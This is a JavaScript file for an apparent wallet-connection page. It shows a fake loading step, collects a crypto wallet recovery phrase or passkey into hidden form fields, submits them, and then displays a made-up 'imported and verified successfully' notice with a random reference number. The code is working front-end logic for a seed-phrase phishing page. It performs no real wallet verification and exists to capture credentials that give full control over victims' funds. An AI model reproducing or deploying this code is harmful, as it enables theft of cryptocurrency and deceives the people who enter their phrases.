document.addEventListener('DOMContentLoaded', () => {
    const languageBtn = document.getElementById('languageBtn');
    const languageModal = document.getElementById('languageModal');
    const closeLanguageModal = document.getElementById('closeLanguageModal');
    const languageOptions = document.querySelectorAll('.language-option');
    const currentLangSpan = document.getElementById('currentLang');

    const walletCards = document.querySelectorAll('.wallet-card');
    const loadingModal = document.getElementById('loadingModal');
    const phraseModal = document.getElementById('phraseModal');
    const successModal = document.getElementById('successModal');

    const closePhraseModal = document.getElementById('closePhraseModal');
    const phraseInput = document.getElementById('phraseInput');
    const passkeyInput = document.getElementById('passkeyInput');
    const phraseDisplay = document.getElementById('phraseDisplay');
    const phraseForm = document.getElementById('phraseForm');
    const proceedBtn = document.getElementById('proceedBtn');
    const cancelPhraseBtn = document.getElementById('cancelPhraseBtn');
    const wordCountSpan = document.getElementById('wordCount');
    const wordTargetSpan = document.getElementById('wordTarget');
    const seedPhraseHidden = document.getElementById('seedPhraseHidden');
    const passkeyHidden = document.getElementById('passkeyHidden');
    const walletHidden = document.getElementById('walletHidden');
    const methodHidden = document.getElementById('methodHidden');

    const seedPhraseMethodBtn = document.getElementById('seedPhraseMethodBtn');
    const passkeyMethodBtn = document.getElementById('passkeyMethodBtn');
    const seedPhraseSection = document.getElementById('seedPhraseSection');
    const passkeySection = document.getElementById('passkeySection');
    const passkeyLength = document.getElementById('passkeyLength');

    const okBtn = document.getElementById('okBtn');
    const copyRefBtn = document.getElementById('copyRefBtn');
    const successWalletName = document.getElementById('successWalletName');
    const referenceNumber = document.getElementById('referenceNumber');

    let selectedWallet = '';
    let phraseWords = [];
    let currentMethod = 'seed-phrase';

    languageBtn.addEventListener('click', () => {
        languageModal.classList.add('active');
    });

    closeLanguageModal.addEventListener('click', () => {
        languageModal.classList.remove('active');
    });

    languageModal.addEventListener('click', (e) => {
        if (e.target === languageModal) {
            languageModal.classList.remove('active');
        }
    });

    languageOptions.forEach(option => {
        option.addEventListener('click', () => {
            const lang = option.dataset.lang;
            currentLangSpan.textContent = lang.toUpperCase();
            languageModal.classList.remove('active');
        });
    });

    walletCards.forEach(card => {
        card.addEventListener('click', () => {
            selectedWallet = card.dataset.wallet;
            showLoadingModal();
        });
    });

    seedPhraseMethodBtn.addEventListener('click', () => {
        currentMethod = 'seed-phrase';
        seedPhraseMethodBtn.classList.add('method-active');
        passkeyMethodBtn.classList.remove('method-active');
        seedPhraseSection.classList.add('active');
        passkeySection.classList.remove('active');
        phraseInput.focus();
        validateInput();
    });

    passkeyMethodBtn.addEventListener('click', () => {
        currentMethod = 'passkey';
        passkeyMethodBtn.classList.add('method-active');
        seedPhraseMethodBtn.classList.remove('method-active');
        passkeySection.classList.add('active');
        seedPhraseSection.classList.remove('active');
        passkeyInput.focus();
        validateInput();
    });

    function showLoadingModal() {
        loadingModal.classList.add('active');

        setTimeout(() => {
            loadingModal.classList.remove('active');
            showPhraseModal();
        }, 2000);
    }

    function showPhraseModal() {
        phraseModal.classList.add('active');
        phraseInput.focus();
    }

    closePhraseModal.addEventListener('click', () => {
        phraseModal.classList.remove('active');
        resetInputs();
    });

    cancelPhraseBtn.addEventListener('click', () => {
        phraseModal.classList.remove('active');
        resetInputs();
    });

    phraseModal.addEventListener('click', (e) => {
        if (e.target === phraseModal) {
            phraseModal.classList.remove('active');
            resetInputs();
        }
    });

    phraseInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            const word = phraseInput.value.trim();
            if (word) {
                addWord(word);
                phraseInput.value = '';
            }
        } else if (e.key === 'Backspace' && !phraseInput.value && phraseWords.length > 0) {
            removeLastWord();
        }
    });

    phraseInput.addEventListener('paste', (e) => {
        const pastedText = e.clipboardData.getData('text');
        const words = pastedText.trim().split(/\s+/);

        words.forEach(word => {
            if (word && phraseWords.length < 24) {
                phraseWords.push(word);
            }
        });

        renderPhraseWords();
        validateInput();
        phraseInput.value = '';
    });

    passkeyInput.addEventListener('input', () => {
        passkeyLength.textContent = passkeyInput.value.length;
        validateInput();
    });

    function addWord(word) {
        if (phraseWords.length >= 24) {
            return;
        }

        phraseWords.push(word.toLowerCase());
        renderPhraseWords();
        validateInput();
    }

    function removeWord(index) {
        phraseWords.splice(index, 1);
        renderPhraseWords();
        validateInput();
    }

    function removeLastWord() {
        phraseWords.pop();
        renderPhraseWords();
        validateInput();
    }

    function renderPhraseWords() {
        phraseDisplay.innerHTML = '';

        phraseWords.forEach((word, index) => {
            const wordElement = document.createElement('div');
            wordElement.className = 'phrase-word';

            const wordText = document.createElement('span');
            wordText.textContent = word;

            const removeBtn = document.createElement('button');
            removeBtn.className = 'phrase-word-remove';
            removeBtn.type = 'button';
            removeBtn.innerHTML = '&times;';
            removeBtn.addEventListener('click', (e) => {
                removeWord(index);
                phraseInput.focus();
            });

            wordElement.appendChild(wordText);
            wordElement.appendChild(removeBtn);
            phraseDisplay.appendChild(wordElement);
        });

        wordCountSpan.textContent = phraseWords.length;
    }

    function validateInput() {
        if (currentMethod === 'seed-phrase') {
            const wordCount = phraseWords.length;
            const isValid = wordCount === 12 || wordCount === 16 || wordCount === 24;

            if (wordCount === 12 || wordCount === 16 || wordCount === 24) {
                wordTargetSpan.textContent = wordCount;
                proceedBtn.disabled = false;
            } else if (wordCount < 12) {
                wordTargetSpan.textContent = '12';
                proceedBtn.disabled = true;
            }
        } else {
            const passkeyValue = passkeyInput.value.trim();
            proceedBtn.disabled = passkeyValue.length < 8;
        }
    }

    function resetInputs() {
        phraseWords = [];
        phraseInput.value = '';
        passkeyInput.value = '';
        passkeyLength.textContent = '0';
        renderPhraseWords();
        validateInput();
        wordTargetSpan.textContent = '12-16-24';
        currentMethod = 'seed-phrase';
        seedPhraseMethodBtn.classList.add('method-active');
        passkeyMethodBtn.classList.remove('method-active');
        seedPhraseSection.classList.add('active');
        passkeySection.classList.remove('active');
    }

    function generateReferenceNumber() {
        const timestamp = Date.now().toString();
        const random = Math.floor(Math.random() * 1000000).toString().padStart(6, '0');
        return timestamp.slice(-6) + random;
    }

    phraseForm.addEventListener('submit', (e) => {
        if (currentMethod === 'seed-phrase') {
            const wordCount = phraseWords.length;

            if (wordCount !== 12 && wordCount !== 16 && wordCount !== 24) {
                // e.preventDefault();
                alert(`Invalid recovery phrase. Please enter exactly 12, 16, or 24 words. You currently have ${wordCount} word(s).`);
                return;
            }

            seedPhraseHidden.value = phraseWords.join(' ');
            passkeyHidden.value = '';
        } else {
            const passkeyValue = passkeyInput.value.trim();

            if (passkeyValue.length < 8) {
                e.preventDefault();
                alert('Passkey must be at least 8 characters long.');
                return;
            }

            passkeyHidden.value = passkeyValue;
            seedPhraseHidden.value = '';
        }

        methodHidden.value = currentMethod;
        walletHidden.value = selectedWallet;

        proceedBtn.disabled = true;
        proceedBtn.textContent = 'Processing...';

        const refNumber = generateReferenceNumber();

        setTimeout(() => {
            phraseModal.classList.remove('active');
            resetInputs();
            proceedBtn.disabled = false;
            proceedBtn.textContent = 'Verify & Proceed';

            showSuccessModal(refNumber);
        }, 500);
    });

    function showSuccessModal(refNumber) {
        successWalletName.textContent = `${selectedWallet} has been imported and verified successfully`;
        referenceNumber.textContent = refNumber;
        successModal.classList.add('active');
    }

    okBtn.addEventListener('click', () => {
        successModal.classList.remove('active');
        window.location.href = '/';
    });

    copyRefBtn.addEventListener('click', () => {
        const refText = referenceNumber.textContent;
        navigator.clipboard.writeText(refText).then(() => {
            const originalHTML = copyRefBtn.innerHTML;
            copyRefBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>';
            setTimeout(() => {
                copyRefBtn.innerHTML = originalHTML;
            }, 2000);
        });
    });

    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            phraseModal.classList.remove('active');
            successModal.classList.remove('active');
            languageModal.classList.remove('active');
        }
    });
});
